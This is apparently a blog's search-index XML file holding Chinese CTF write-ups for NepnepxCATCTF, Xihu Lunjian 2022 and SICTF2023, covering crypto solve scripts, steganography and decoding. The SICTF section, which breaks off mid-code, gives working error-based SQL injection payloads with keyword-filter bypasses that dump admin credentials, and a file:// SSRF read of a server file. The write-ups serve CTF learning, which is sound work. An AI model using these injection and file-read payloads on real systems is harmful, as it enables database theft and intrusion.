<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>NepnepxCATCTF</title>
    <link href="/2023/02/09/NepnepxCATCTF/"/>
    <url>/2023/02/09/NepnepxCATCTF/</url>
    
    <content type="html"><![CDATA[<p><a name="ceHvQ"></a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><a name="rgliv"></a></p><h3 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h3><p><img src="/mdimg/NepnepxCATCTF/1.png"><br /><img src="/mdimg/NepnepxCATCTF/2.png"><br><a name="lLkVy"></a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p><a name="whfyc"></a></p><h3 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h3><p><img src="/mdimg/NepnepxCATCTF/3.png"><br>:::tips<br><strong>1 - 1/3 + 1/5 - 1/7 + …  是求Π/4 近似值的c语言算法     分成4份，所以是派(pie)</strong><br>:::<br> CatCTF{pie}<br><a name="cXq7p"></a></p><h3 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h3><p><img src="/mdimg/NepnepxCATCTF/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> data<br><br>iv=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]) <br>iva=copy(iv)<br>key=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>data=pad(data,<span class="hljs-number">16</span>)<br>c=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">16</span>):<br>    s=data[i:i+<span class="hljs-number">16</span>].ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>    c+=cipher.encrypt(xor(s,iv))<br>    iv=xor(s,c[-<span class="hljs-number">16</span>:])<br><br><br>key=b64encode(key)<br>c=b64encode(c)<br><br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-built_in">print</span>(c)<br><br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span><br><span class="hljs-string">b&#x27;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&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>:::tips<br>这段代码实现了对明文数据进行加密，并使用了 AES 加密算法，使用了 ECB 模式。<br />它先生成了一个 16 字节的随机密钥和一个 16 字节的随机初始化向量 (IV)。然后使用这个密钥和 IV 初始化一个 AES 加密器。接着，它对明文数据进行补齐，使其长度是 16 的倍数，并将明文分块。每一块都使用相同的密钥进行加密，但是使用的 IV 是加密的前一块的输出与当前块的异或。<br />最后，将加密的密钥和密文进行 base64 编码，并输出。<br>:::</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 将密钥和密文 base64 解码</span><br>key = b64decode(<span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span>)<br>ciphertext = b64decode(<span class="hljs-string">b&#x27;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&#x27;</span><br>)<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>c2 = [ciphertext[i:i+<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ciphertext),<span class="hljs-number">16</span>)]<br>xor_s = []<br>xor_iv = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> ciphertext <span class="hljs-keyword">in</span> c2:<br>    xor_s.append(cipher.decrypt(ciphertext))<br>    <br>s = <span class="hljs-string">b&#x27;&#x27;</span><br>tiv = <span class="hljs-string">b&#x27;\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30&#x27;</span> <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">0x99</span>]:<br>    iv = tiv+long_to_bytes(j)<br>    trycry = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(xor_s)):<br>        s = xor(xor_s[i], iv)<br>        iv = xor(s, c2[i])<br>        <span class="hljs-keyword">try</span>:<br>            trycry += s.decode()<br>            <span class="hljs-keyword">if</span> trycry[-<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> printable:<br>                <span class="hljs-keyword">break</span><br>            trycry += <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> trycry:   <span class="hljs-comment">#查找关键字flag</span><br>        <span class="hljs-built_in">print</span>(trycry)<br>        <span class="hljs-comment">#flag&#123;This&#x27;s_why_PCBC_is_not_living&#125;</span><br></code></pre></td></tr></table></figure><p><a name="wEvbq"></a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p><a name="CdyBq"></a></p><h3 id="CatCat"><a href="#CatCat" class="headerlink" title="CatCat"></a>CatCat</h3><p>图片010打开检索password出密码  catflag<br />然后rabbit密码解密，密钥为catflag<br />然后base91解码<br />最后Ook解码<br /><img src="/mdimg/NepnepxCATCTF/5.png"><br /><img src="/mdimg/NepnepxCATCTF/6.png"><br /><img src="/mdimg/NepnepxCATCTF/7.png"><br><a name="pBbsC"></a></p><h3 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h3><p>010打开<br /><img src="/mdimg/NepnepxCATCTF/8.png"><br>:::tips<br>CatCTF{CAT_GOES_MEOW}<br>:::<br><a name="znyp0"></a></p><h3 id="Cat-Jump"><a href="#Cat-Jump" class="headerlink" title="Cat_Jump"></a>Cat_Jump</h3><p>010打开检索<br /><img src="/mdimg/NepnepxCATCTF/9.png"><br>:::tips<br>CatCTF{EFI_1sv3ry_funn9}<br>:::<br><a name="AAzOJ"></a></p><h3 id="miao"><a href="#miao" class="headerlink" title="miao~"></a>miao~</h3><p>foremost分离出一个音频<br /><img src="/mdimg/NepnepxCATCTF/10.png"><br />Audacity打开<br /><img src="/mdimg/NepnepxCATCTF/11.png"><br />得到key：CatCTF<br />DeepSound打开<br /><img src="/mdimg/NepnepxCATCTF/12.png"><br /><img src="/mdimg/NepnepxCATCTF/13.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊 <br></code></pre></td></tr></table></figure><p>兽音解密 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a><br /><img src="/mdimg/NepnepxCATCTF/14.png"><br><a name="FZXy4"></a></p><h3 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h3><p>打开是GPS数据<br /><img src="/mdimg/NepnepxCATCTF/15.png"><br />参考：<a href="https://blog.csdn.net/jwq2011/article/details/53674125">https://blog.csdn.net/jwq2011/article/details/53674125</a><br />GPS路径可视化<br /><img src="/mdimg/NepnepxCATCTF/16.png"><br>:::tips<br>CatCTF{GPS_M1ao}<br>:::<br><a name="TqEz9"></a></p><h3 id="Peekaboo"><a href="#Peekaboo" class="headerlink" title="Peekaboo"></a>Peekaboo</h3><p>一个一个试，试出来是百里玄策</p><p><a name="iX5fH"></a></p><h3 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h3><p>丢linux直接cat flag<br /><img src="/mdimg/NepnepxCATCTF/17.png"><br><a name="Wl3K6"></a></p><h3 id="Nepnep-祝你新年快乐啦！"><a href="#Nepnep-祝你新年快乐啦！" class="headerlink" title="Nepnep 祝你新年快乐啦！"></a>Nepnep 祝你新年快乐啦！</h3><p><img src="/mdimg/NepnepxCATCTF/18.png"></p><p><a name="D7CNc"></a></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><p><a name="unJt8"></a></p><h3 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h3><p><img src="/mdimg/NepnepxCATCTF/19.png"><br /><img src="/mdimg/NepnepxCATCTF/20.png"><br />0~100尝试，必出，结果 0%就出了<br>:::tips<br> CatCTF{<strong>9f1ef07877f9d85a82bd500f408b4814}</strong><br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑2022初赛</title>
    <link href="/2023/02/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022%E5%88%9D%E8%B5%9B/"/>
    <url>/2023/02/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="MP3"><a href="#MP3" class="headerlink" title="MP3"></a>MP3</h3><p>下载得到一个mp3文件，foremost分离出来一个图片<br><img src="/mding/%E8%A5%BF%E6%B9%96/1.png"><br>zsteg看看<br><img src="/mding/%E8%A5%BF%E6%B9%96/2.png"><br>zsteg提取<br><code>zsteg -e b1,r,lsb,xy 6.png &gt; 6.zip  </code><br><img src="/mding/%E8%A5%BF%E6%B9%96/3.png"><br>MP3stego：<a href="https://www.petitcolas.net/steganography/mp3stego/">https://www.petitcolas.net/steganography/mp3stego/</a><br>项目源码：<a href="https://github.com/fabienpe/MP3Stego">https://github.com/fabienpe/MP3Stego</a><br><img src="/mding/%E8%A5%BF%E6%B9%96/4.png"><br>得到压缩包密码 8750d5109208213f<br><img src="/mding/%E8%A5%BF%E6%B9%96/5.png"><br>解压缩包<br><img src="/mding/%E8%A5%BF%E6%B9%96/6.png"><br>rot47<br><img src="/mding/%E8%A5%BF%E6%B9%96/7.png"><br>js解码，控制台<br><img src="/mding/%E8%A5%BF%E6%B9%96/8.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SICTF2023 wp</title>
    <link href="/2023/02/09/SICTF2023wp/"/>
    <url>/2023/02/09/SICTF2023wp/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p><img src="/mdimg/sictf/1.png"><br><img src="/mdimg/sictf/2.png"><br><strong>用户名处存在sql注入</strong><br><img src="/mdimg/sictf/3.png"><br>**看源码发现是post参数user和pass    **<br><strong>fuzz一下</strong><br><img src="/mdimg/sictf/4.png"></p><blockquote><p>过滤了union，select，空格，=</p></blockquote><p>；没过滤尝试堆叠注入无果，updatexml没过滤，报错注入<br><code>user=1&#39;/**/and/**/updatexml(1,concat(0x7e,database()),0)#&amp;pass=1</code>      //ctf_db<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>           // Username,Password<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Username)from/**/admin)),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Password)from/**/admin)),0x7e)#&amp;pass=1</code>    // 0909876qwe222<br>登录：<br><img src="/mdimg/sictf/5.png"><br>post：url=1试试<br><img src="/mdimg/sictf/6.png"><br><code>url=file:///var/www/html/x9sd.php</code>读取x9sd.php<br><img src="/mdimg/sictf/7.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 